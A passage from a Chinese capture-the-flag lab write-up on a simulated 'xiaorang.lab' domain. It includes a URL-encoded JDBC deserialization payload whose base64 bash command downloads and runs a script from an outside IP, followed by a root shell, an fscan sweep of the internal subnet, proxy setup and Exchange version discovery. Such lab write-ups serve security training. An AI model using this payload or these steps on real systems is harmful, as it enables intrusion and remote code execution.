class="number">6</span>f%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">34</span>%<span class="number">37</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">31</span>%<span class="number">33</span>%<span class="number">2</span>e%<span class="number">32</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">70</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">74</span>%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">6</span>e%<span class="number">65</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">30</span>%<span class="number">36</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">66</span>%<span class="number">6</span>f%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">7</span>b%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">75</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">79</span>%<span class="number">73</span>%<span class="number">6</span>f%<span class="number">5</span>f%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">6</span>d%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">73</span>%<span class="number">43</span>%<span class="number">6</span>f%<span class="number">6</span>c%<span class="number">6</span>c%<span class="number">65</span>%<span class="number">63</span>%<span class="number">74</span>%<span class="number">69</span>%<span class="number">6</span>f%<span class="number">6</span>e%<span class="number">73</span>%<span class="number">36</span>%<span class="number">5</span>f%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">20</span>%<span class="number">2</span>d%<span class="number">63</span>%<span class="number">20</span>%<span class="number">7</span>b%<span class="number">65</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">2</span>c%<span class="number">4</span>b%<span class="number">47</span>%<span class="number">4</span>e%<span class="number">31</span>%<span class="number">63</span>%<span class="number">6</span>d%<span class="number">77</span>%<span class="number">67</span>%<span class="number">4</span>c%<span class="number">57</span>%<span class="number">5</span>a%<span class="number">7</span>a%<span class="number">55</span>%<span class="number">30</span>%<span class="number">77</span>%<span class="number">67</span>%<span class="number">4</span>c%<span class="number">57</span>%<span class="number">30</span>%<span class="number">78</span>%<span class="number">4</span>f%<span class="number">44</span>%<span class="number">41</span>%<span class="number">67</span>%<span class="number">61</span>%<span class="number">48</span>%<span class="number">52</span>%<span class="number">30</span>%<span class="number">63</span>%<span class="number">44</span>%<span class="number">6</span>f%<span class="number">76</span>%<span class="number">4</span>c%<span class="number">7</span>a%<span class="number">51</span>%<span class="number">33</span>%<span class="number">4</span>c%<span class="number">6</span>a%<span class="number">45</span>%<span class="number">78</span>%<span class="number">4</span>d%<span class="number">79</span>%<span class="number">34</span>%<span class="number">79</span>%<span class="number">4</span>d%<span class="number">6</span>a%<span class="number">6</span>b%<span class="number">75</span>%<span class="number">4</span>d%<span class="number">54</span>%<span class="number">4</span>d%<span class="number">32</span>%<span class="number">4</span>f%<span class="number">6</span>a%<span class="number">67</span>%<span class="number">34</span>%<span class="number">4</span>f%<span class="number">54</span>%<span class="number">6</span>b%<span class="number">76</span>%<span class="number">63</span>%<span class="number">32</span>%<span class="number">78</span>%<span class="number">30</span>%<span class="number">66</span>%<span class="number">48</span>%<span class="number">78</span>%<span class="number">33</span>%<span class="number">5</span>a%<span class="number">32</span>%<span class="number">56</span>%<span class="number">30</span>%<span class="number">49</span>%<span class="number">43</span>%<span class="number">31</span>%<span class="number">55</span>%<span class="number">4</span>d%<span class="number">54</span>%<span class="number">67</span>%<span class="number">77</span>%<span class="number">49</span>%<span class="number">43</span>%<span class="number">31</span>%<span class="number">78</span>%<span class="number">49</span>%<span class="number">47</span>%<span class="number">68</span>%<span class="number">30</span>%<span class="number">64</span>%<span class="number">48</span>%<span class="number">41</span>%<span class="number">36</span>%<span class="number">4</span>c%<span class="number">79</span>%<span class="number">38</span>%<span class="number">30</span>%<span class="number">4</span>e%<span class="number">79</span>%<span class="number">34</span>%<span class="number">78</span>%<span class="number">4</span>d%<span class="number">54</span>%<span class="number">4</span>d%<span class="number">75</span>%<span class="number">4</span>d%<span class="number">6</span>a%<span class="number">49</span>%<span class="number">35</span>%<span class="number">4</span>c%<span class="number">6</span>a%<span class="number">45</span>%<span class="number">7</span>a%<span class="number">4</span>e%<span class="number">6</span>a%<span class="number">6</span>f%<span class="number">34</span>%<span class="number">4</span>f%<span class="number">44</span>%<span class="number">6</span>b%<span class="number">35</span>%<span class="number">4</span>c%<span class="number">33</span>%<span class="number">4</span>e%<span class="number">73</span>%<span class="number">64</span>%<span class="number">43</span>%<span class="number">6</span>c%<span class="number">38</span>%<span class="number">63</span>%<span class="number">32</span>%<span class="number">67</span>%<span class="number">3</span>d%<span class="number">7</span>d%<span class="number">7</span>c%<span class="number">7</span>b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">36</span>%<span class="number">34</span>%<span class="number">2</span>c%<span class="number">2</span>d%<span class="number">64</span>%<span class="number">7</span>d%<span class="number">7</span>c%<span class="number">7</span>b%<span class="number">62</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">68</span>%<span class="number">2</span>c%<span class="number">2</span>d%<span class="number">69</span>%<span class="number">7</span>d%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">77</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">64</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">73</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">65</span>%<span class="number">6</span>d%<span class="number">65</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">63</span>%<span class="number">65</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">73</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">63</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">2</span>e%<span class="number">6</span>d%<span class="number">79</span>%<span class="number">73</span>%<span class="number">71</span>%<span class="number">6</span>c%<span class="number">2</span>e%<span class="number">6</span>a%<span class="number">64</span>%<span class="number">62</span>%<span class="number">63</span>%<span class="number">2</span>e%<span class="number">69</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">63</span>%<span class="number">65</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">73</span>%<span class="number">2</span>e%<span class="number">53</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">76</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">53</span>%<span class="number">74</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">75</span>%<span class="number">73</span>%<span class="number">44</span>%<span class="number">69</span>%<span class="number">66</span>%<span class="number">66</span>%<span class="number">49</span>%<span class="number">6</span>e%<span class="number">74</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">63</span>%<span class="number">65</span>%<span class="number">70</span>%<span class="number">74</span>%<span class="number">6</span>f%<span class="number">72</span>%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">61</span>%<span class="number">75</span>%<span class="number">74</span>%<span class="number">6</span>f%<span class="number">44</span>%<span class="number">65</span>%<span class="number">73</span>%<span class="number">65</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">61</span>%<span class="number">6</span>c%<span class="number">69</span>%<span class="number">7</span>a%<span class="number">65</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">74</span>%<span class="number">72</span>%<span class="number">75</span>%<span class="number">65</span>%<span class="number">22</span>%<span class="number">2</span>c%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">09</span>%<span class="number">22</span>%<span class="number">4</span>e%<span class="number">55</span>%<span class="number">4</span>d%<span class="number">5</span>f%<span class="number">48</span>%<span class="number">4</span>f%<span class="number">53</span>%<span class="number">54</span>%<span class="number">53</span>%<span class="number">22</span>%<span class="number">3</span>a%<span class="number">20</span>%<span class="number">22</span>%<span class="number">31</span>%<span class="number">22</span>%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">09</span>%<span class="number">7</span>d%<span class="number">0</span>a%<span class="number">09</span>%<span class="number">7</span>d%<span class="number">0</span>a  HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.99</span>.<span class="number">153.253</span>:<span class="number">8000</span></span><br><span class="line">Accept: application/json, text/javascript, */*; q=<span class="number">0.01</span></span><br><span class="line">X<span class="literal">-Requested-With</span>: XMLHttpRequest</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Referer: http://<span class="number">39.99</span>.<span class="number">153.253</span>:<span class="number">8000</span>/pages/manage/user.html</span><br><span class="line">Cookie: JSESSIONID=<span class="number">43</span>E44DB890C5656C424FC98D0703203D; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="number">1747726313</span>; HMACCOUNT=<span class="number">9835</span>B12E3CB67BEC; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="number">1747726418</span></span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">136.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/12.png"></p><p>上线成功，root权限</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/13.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/14.png"></p><p>那么接下来先信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@iZ8vbaf1uzquhhj6l19qvhZ:/usr/bin<span class="comment"># ifconfig</span></span><br><span class="line">eth0      Link encap:Ethernet  HWaddr <span class="number">00</span>:<span class="number">16</span>:<span class="number">3</span>e:<span class="number">22</span>:<span class="number">28</span>:<span class="number">40</span>  </span><br><span class="line">          inet addr:<span class="number">172.22</span>.<span class="number">3.12</span>  Bcast:<span class="number">172.22</span>.<span class="number">255.255</span>  Mask:<span class="number">255.255</span>.<span class="number">0.0</span></span><br><span class="line">          inet6 addr: fe80::<span class="number">216</span>:<span class="number">3</span>eff:fe22:<span class="number">2840</span>/<span class="number">64</span> Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:<span class="number">1500</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">131516</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">34744</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1000</span> </span><br><span class="line">          RX bytes:<span class="number">161645064</span> (<span class="number">161.6</span> MB)  TX bytes:<span class="number">20853407</span> (<span class="number">20.8</span> MB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:<span class="number">127.0</span>.<span class="number">0.1</span>  Mask:<span class="number">255.0</span>.<span class="number">0.0</span></span><br><span class="line">          inet6 addr: ::<span class="number">1</span>/<span class="number">128</span> Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:<span class="number">65536</span>  Metric:<span class="number">1</span></span><br><span class="line">          RX packets:<span class="number">1597</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> frame:<span class="number">0</span></span><br><span class="line">          TX packets:<span class="number">1597</span> errors:<span class="number">0</span> dropped:<span class="number">0</span> overruns:<span class="number">0</span> carrier:<span class="number">0</span></span><br><span class="line">          collisions:<span class="number">0</span> txqueuelen:<span class="number">1</span> </span><br><span class="line">          RX bytes:<span class="number">312929</span> (<span class="number">312.9</span> KB)  TX bytes:<span class="number">312929</span> (<span class="number">312.9</span> KB)</span><br></pre></td></tr></table></figure><p>存在内网段172.22.3.12&#x2F;24</p><p>先上传fscan进行扫描</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/15.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">root@iZ8vbaf1uzquhhj6l19qvhZ:/tmp<span class="comment"># fscan -h 172.22.3.12/24</span></span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /    │</span></span><br><span class="line"><span class="string">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span></span><br><span class="line"><span class="string">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span></span><br><span class="line"><span class="string">└──────────────────────────────────────────────┘</span></span><br><span class="line"><span class="string">      Fscan Version: 2.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] 暴力破解线程数: 1</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] 开始信息扫描</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] CIDR范围: 172.22.3.0-172.22.3.255</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] 生成IP范围: 172.22.3.0.%!d(string=172.22.3.255) - %!s(MISSING).%!d(MISSING)</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] 解析CIDR 172.22.3.12/24 -&gt; IP范围 172.22.3.0-172.22.3.255</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] 最终有效主机数量: 256</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [INFO] 开始主机扫描</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [SUCCESS] 目标 172.22.3.12     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [SUCCESS] 目标 172.22.3.2      存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [SUCCESS] 目标 172.22.3.9      存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:09] [SUCCESS] 目标 172.22.3.26     存活 (ICMP)</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [INFO] 存活主机数量: 4</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [INFO] 有效端口数量: 233</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.2:88</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:81</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:80</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.12:80</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.12:22</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.2:445</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:443</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.2:389</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.26:139</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.26:135</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:139</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.2:139</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:135</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.2:135</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:808</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.26:445</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:445</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.9:6080</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:12] [SUCCESS] 端口开放 172.22.3.12:8000</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:13] [SUCCESS] 服务识别 172.22.3.12:22 =&gt; [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:13] [SUCCESS] 端口开放 172.22.3.9:8172</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:17] [SUCCESS] 服务识别 172.22.3.2:88 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.2:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.12:80 =&gt; [http] 版本:1.10.3 产品:nginx 系统:Linux 信息:Ubuntu</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.2:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.9:81 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.26:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.9:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.2:139 =&gt;  Banner:[.]</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.9:808 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.26:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:07:18] [SUCCESS] 服务识别 172.22.3.9:445 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:07:19] [SUCCESS] 服务识别 172.22.3.9:80 =&gt; [http] 版本:10.0 产品:Microsoft IIS httpd 系统:Windows</span></span><br><span class="line"><span class="string">[2025-05-20 16:07:23] [SUCCESS] 服务识别 172.22.3.12:8000 =&gt; [http]</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:08] [SUCCESS] 服务识别 172.22.3.9:6080 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:08] [SUCCESS] 服务识别 172.22.3.9:8172 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:18] [SUCCESS] 服务识别 172.22.3.26:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:18] [SUCCESS] 服务识别 172.22.3.9:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:18] [SUCCESS] 服务识别 172.22.3.2:135 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] 服务识别 172.22.3.9:443 =&gt; </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [INFO] 存活端口数量: 20</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [INFO] 开始漏洞扫描</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, ssh, webpoc, webtitle</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] 网站标题 http://172.22.3.12        状态码:200 长度:19813  标题:lumia</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] 网站标题 http://172.22.3.9         状态码:403 长度:0      标题:无标题</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] NetBios 172.22.3.26     XIAORANG\XIAORANG-PC          </span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.22.3.26</span></span><br><span class="line"><span class="string">主机名: XIAORANG-PC</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.22.3.26</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.22.3.9</span></span><br><span class="line"><span class="string">主机名: XIAORANG-EXC01</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.22.3.9</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] NetInfo 扫描结果</span></span><br><span class="line"><span class="string">目标主机: 172.22.3.2</span></span><br><span class="line"><span class="string">主机名: XIAORANG-WIN16</span></span><br><span class="line"><span class="string">发现的网络接口:</span></span><br><span class="line"><span class="string">   IPv4地址:</span></span><br><span class="line"><span class="string">      └─ 172.22.3.2</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] NetBios 172.22.3.2      DC:XIAORANG-WIN16.xiaorang.lab      kWindows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [INFO] 系统信息 172.22.3.2 [Windows Server 2016 Datacenter 14393]</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] NetBios 172.22.3.9      XIAORANG-EXC01.xiaorang.lab         Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] 网站标题 http://172.22.3.9:81      状态码:403 长度:1157   标题:403 - 禁止访问: 访问被拒绝。</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] 网站标题 http://172.22.3.12:8000   状态码:302 长度:0      标题:无标题 重定向地址: http://172.22.3.12:8000/login.html</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:38] [SUCCESS] 网站标题 https://172.22.3.9        状态码:302 长度:0      标题:无标题 重定向地址: https://172.22.3.9/owa/</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:39] [SUCCESS] 网站标题 http://172.22.3.12:8000/login.html 状态码:200 长度:5662   标题:Lumia ERP</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:39] [SUCCESS] 网站标题 https://172.22.3.9/owa/auth/logon.aspx?url=https%3a%2f%2f172.22.3.9%2fowa%2f&amp;reason=0 状态码:200 长度:28237  标题:Outlook</span></span><br><span class="line"><span class="string">[2025-05-20 16:08:39] [SUCCESS] 网站标题 https://172.22.3.9:8172   状态码:404 长度:0      标题:无标题</span></span><br><span class="line"><span class="string">[2025-05-20 16:10:23] [SUCCESS] 扫描已完成: 38/38</span></span><br></pre></td></tr></table></figure><p>然后挂载代理，这里直接vshell挂了</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/16.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/17.png"></p><p>简单整理一下资产</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">172.22</span>.<span class="number">3.12</span></span><br><span class="line">已经拿下的web服务器</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.9</span></span><br><span class="line">exchange服务器    XIAORANG<span class="literal">-EXC01</span>.xiaorang.lab    https://<span class="number">172.22</span>.<span class="number">3.9</span>/owa/</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.2</span></span><br><span class="line">DC:XIAORANG<span class="literal">-WIN16</span>.xiaorang.lab</span><br><span class="line"><span class="number">172.22</span>.<span class="number">3.26</span> </span><br><span class="line"></span><br><span class="line">  XIAORANG<span class="literal">-PC</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来看见邮服了，那肯定先打邮服</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/18.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange/19.png"></p><p>F12加ctrl+shift+F进行全局搜索&#x2F;owa&#x2F;auth,即可看到当前exchange的版本号。</p><p>可以看到是15.1.1591</p><p>查了看见就是2016</p><p><a 